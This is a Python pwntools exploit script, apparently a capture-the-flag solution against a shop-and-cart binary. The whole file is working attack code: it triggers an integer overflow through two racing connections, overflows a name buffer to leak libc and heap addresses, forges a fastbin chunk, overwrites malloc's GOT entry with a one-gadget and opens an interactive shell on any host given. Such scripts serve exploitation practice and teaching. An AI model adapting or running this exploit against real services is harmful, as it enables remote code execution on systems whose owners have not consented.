#!/usr/bin/python
from pwn import *
import sys
import os

log.warning('Usage: ./exp.py [HOST] [PORT]')
prog = os.path.dirname(os.path.abspath(__file__)).split('/')[-1]
elf = ELF(prog)
if not elf: log.warning('Cannot open ' + prog)
libc = ELF('libc.so.6') if len(sys.argv) > 2 else elf.libc
if not libc: log.warning('Cannot open libc.so.6')
HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)

context.word_size = 64
r1 = remote(HOST, PORT)
r2 = remote(HOST, PORT)
g = [r1, r2]
s = [0, 0]
m = [1000000, 0]

def shop(conn, act, name='', price=0, stock=1):
    global g, s, m
    r = g[conn]
    status = s[conn]

    if status == 0:
        r.recvuntil(': ')
        r.sendline('1')
        s[conn] = 1
 
    r.recvuntil('#### SHOP MODE ($')
    m[conn] = r.recvuntil(')').strip(')')

    r.recvuntil(': ')
    if 'add' in act: 
        r.sendline('1')
        r.recvuntil('Name >> ')
        r.sendline(name, 128)
        r.sendlineafter('Price >> ', str(price))
        r.sendlineafter('Stock >> ', str(stock))
    elif 'list' in act: 
        r.sendline('2')
        r.recvuntil('&&&&&& PRODUCT &&&&&&\n')
        return r.recvline().split()[4].strip(')')
    elif 'reset' in act: 
        r.sendline('3')
    elif 'return' in act: 
        s[conn] = 0
        r.sendline('0')

def custom(conn, act, name='', amount=0):
    global g, s
    r = g[conn]
    status = s[conn]

    if status == 0:
        r.sendlineafter(': ', '2')
        s[conn] = 2

    r.recvuntil(': ')
    if 'add' in act: 
        r.sendline('1')
        r.recvuntil('name >> ')
        r.sendline(name, 128)
        r.sendlineafter('Amount >> ', str(amount))
    elif 'list' in act: 
        pass
    elif 'buy' in act: 
        r.sendline('3')
        r.recvuntil('Total: $')
        money = r.recvline().strip()
        if int(money) > pow(2, 31):
            return True
    elif 'reset' in act: 
        pass
    elif 'return' in act: 
        s[conn] = 0
        r.sendline('0')

# trigger money overflow
money = log.progress('money')
while True:
    shop(1, 'add', 'a', 1)
    weight = float(shop(1, 'list'))
    money.status('{}'.format(m[0]))
    if weight > 1.1:
        shop(0, 'add', 'a', m[0])
    else:
        shop(0, 'add', 'a', 0)
    shop(0, 'return')
    custom(0, 'add', 'a', 1)
    if custom(0, 'buy'):
        custom(0, 'return')
        break
    custom(0, 'return')
    shop(0, 'reset')
    shop(1, 'reset')
r2.close()
money.success('money overflow!')
r1.sendlineafter(': ', '1')
r1.sendlineafter('(y/N) >> ', 'y')

r1.recvuntil('name  : ')
r1.sendline('a'*0x40 ,0x40)
r1.recvuntil('crash : ')
r1.sendline('b'*43 ,0x40)
r1.sendlineafter(': ', '0')

# add product & cart
for i in range(4):
    shop(0, 'add', str(i), 1, 1)
shop(0, 'add', 'b', 1, 1)
shop(0, 'return')
custom(0, 'add', 'b', 1)
custom(0, 'return')

# leak libc address
exp = flat(
    'a'*0x1c0, elf.got['__libc_start_main'],
    0, 1, 0
)

r1.sendlineafter(': ', '-1')
r1.sendlineafter('(y/N) >> ', 'y')
r1.sendlineafter('name  : ', exp)
r1.sendlineafter('(y/N) >> ', 'n')
r1.sendlineafter(': ', '1')
r1.sendlineafter(': ', '2')
r1.recvuntil('001 : ')
libc_base = u64(r1.recvuntil('(')[:-1].ljust(8, '\x00')) - libc.symbols['__libc_start_main']
r1.sendlineafter(': ', '0')
log.info('libc_base: ' + hex(libc_base))
libc.address += libc_base

# leak heap address
exp = flat(
    'a'*0x1c0, 0x603100,
    0, 1, 0
)

r1.sendlineafter(': ', '-1')
r1.sendlineafter('(y/N) >> ', 'y')
r1.sendlineafter('name  : ', exp)
r1.sendlineafter('(y/N) >> ', 'n')
r1.sendlineafter(': ', '1')
r1.sendlineafter(': ', '2')
r1.recvuntil('001 : ')
heap_base = u64(r1.recvuntil('(')[:-1].ljust(8, '\x00')) - 0x290
log.info('heap_base: ' + hex(heap_base))
r1.sendlineafter(': ', '0')

# fake fastbin 
fake_chunk = p64(0) + p64(0x41) + 'a'*0x30 + p64(0) + p64(0x21)
exp = flat(
    fake_chunk.ljust(0x1c0-8, '\x00'), 0x31, heap_base + 0xd0 + 0x10,
    0, 1, 0
)

r1.sendlineafter(': ', '-1')
r1.sendlineafter('(y/N) >> ', 'y')
r1.sendlineafter('name  : ', exp)
r1.sendlineafter('(y/N) >> ', 'n')
r1.sendlineafter(': ', '1')
r1.sendlineafter(': ', '3')
r1.sendlineafter(': ', '0')

# fastbin attack
evil = p64(libc_base + 0x4647c)
r1.sendlineafter(': ', '-1')
r1.sendlineafter('(y/N) >> ', 'y')
r1.sendlineafter('name  : ', p64(0) + p64(0x41) + p64(0x60308a)) # overwrite malloc got
r1.sendlineafter('(y/N) >> ', 'n')
r1.sendlineafter(': ', '1')
r1.sendlineafter(': ', '1')
r1.sendline('a'*0x30, 128); r1.sendline(str(0)); r1.sendline(str(1))
r1.sendlineafter(': ', '1')
r1.sendline('a'*0x2e + evil, 128); r1.sendline(str(0)); r1.sendline(str(1))

r1.interactive()
